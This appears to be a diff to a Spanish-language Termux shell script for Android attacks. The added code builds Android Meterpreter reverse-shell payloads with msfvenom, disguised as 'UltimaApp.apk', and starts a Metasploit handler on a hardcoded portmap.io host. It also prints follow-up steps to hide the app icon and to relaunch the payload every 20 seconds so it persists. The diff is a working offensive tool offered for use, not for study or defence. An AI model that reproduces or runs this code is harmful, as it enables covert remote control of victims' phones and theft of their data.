@@ -67,6 +67,7 @@ clear
 printf "
 ==========
 wakelock
+hide_app_icon
 shell
 
 ==========
@@ -85,7 +86,49 @@ clear
 read -p "puerto: " puerto
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
 fi
+if [ "$1" = "-a" ];then
+read -p "host : " host
+read -p "port : " puerto
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$puerto R > /sdcard/download/UltimaApp.apk
+clear
+printf "
+[ + ] El Payload se guardo en /sdcard/download/UltimaApp.apk
+[ + ] Con el Host $host
+[ + ] Con el puerto $puerto
+"
 }
+function sess5 {
+cd
+rm -Rf .dcof
+echo "
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST SaidGR51015-44781.portmap.io
+set LPORT 4546
+exploit
+
+" > $HOME/.dcof
+clear
+printf "
+
+==========
+wakelock
+hide_app_icon
+shell
+
+==========
+#!/bin/bash
+while :
+do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
+sleep 20
+done
+
+==========
+
+"
+msfconsole -q -r $HOME/.dcof
+}
+
 
 
 function clone {
